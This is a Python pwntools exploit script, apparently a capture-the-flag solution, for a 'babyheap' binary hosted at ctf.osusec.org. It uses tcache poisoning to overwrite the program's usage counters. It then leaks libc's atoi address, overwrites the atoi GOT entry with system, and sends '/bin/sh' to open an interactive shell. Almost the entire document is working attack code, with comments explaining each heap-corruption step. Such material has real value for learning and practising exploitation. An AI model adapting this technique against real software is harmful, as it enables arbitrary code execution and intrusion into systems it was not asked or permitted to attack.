#!/usr/bin/python

from pwn import *

out = open("payload", "wb")


def create(p) :
    p.recvuntil("> ")
    p.sendline("1")
    out.write("1".rjust(8, "0"))
def edit(p, content) :
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("?")
    assert len(content) <= 0x40
    p.send(content)
    out.write("2".rjust(8, "0"))
    out.write(content.ljust(0x40, "\x00"))

def show(p) :
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("Content: ")
    s = p.recvline()
    print "Content length " + str(len(s))
    print "Content : " + s
    out.write("3".rjust(8, "0"))
    return s
def delete(p) :
    p.recvuntil("> ")
    p.sendline("4")
    out.write("4".rjust(8, "0"))


def fill(p, content) :
    p.recvuntil("> ")
    p.sendline("1337")
    p.recvuntil("Fill")
    p.send(content)
    assert len(content) <= 0x40
    out.write("1337".rjust(8, "0"))
    out.write(content.ljust(0x40, "\x00"))

## rules
## Normally
## edit(), show(),  delete(), fill() can only call ONCE
## create() can be called TWICE
if len(sys.argv) >= 2 :
    p = remote("ctf.osusec.org", sys.argv[1])
    libc = ELF("./libc.so.6")
else :
    p = process("./babyheap")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

## tcache poisoning : make
##      0x6020a0 != 1 so that we can create() one more time
##      0x6020a8 != 1 so that we can edit() one more time
##      0x6020b0 != 1 so that we can show() one more time
##      0x6020b8 != 1 so that we can delete() one more time
##      0x6020c0 != 1 so that we can fill() AS MANY TIMES AS POSSIBLE
##      0x6020c8 == buf
create(p)
delete(p)
edit(p, p64(0x6020a0))
create(p)

got_atoi = 0x602060
payload = p64(2) + p64(2) + p64(2) + p64(2) + p64(2) + p64(got_atoi)
fill(p, payload)        ## overwrite 0x6020a0 - 0x6020d0

s = show(p)
libc_atoi = leak = u64(s[0:6].ljust(8, "\x00"))
print "libc_atoi : " + hex(leak)
libc_system = libc_atoi + libc.symbols['system'] - libc.symbols['atoi']
edit(p, p64(libc_system))

p.recvuntil("> ")
p.send("/bin/sh" + "\x00")
p.interactive()




